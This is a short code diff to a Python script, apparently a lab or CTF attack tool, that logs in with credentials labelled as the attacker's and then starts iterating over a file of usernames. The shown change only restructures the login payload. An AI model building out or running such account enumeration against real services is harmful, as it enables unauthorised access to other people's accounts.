@@ -18,7 +18,7 @@ username_file = os.path.join(root_dir, "names.txt")
 
 # Attacker's valid login credentials 
 attacker_creds = {
-    "username": "attacker",
+    "identifier": "attacker",
     "password": "test123"
 }
 
@@ -32,11 +32,7 @@ count = 0
 
 session = requests.Session()
 
-login_data = {
-    "identifier": attacker_creds["username"],
-    "password": attacker_creds["password"]
-}
-session.post(login_url, data=login_data)
+session.post(login_url, data=attacker_creds)
 
 with open(username_file, "r", encoding="utf-8", errors="ignore") as f:
     for line in f:
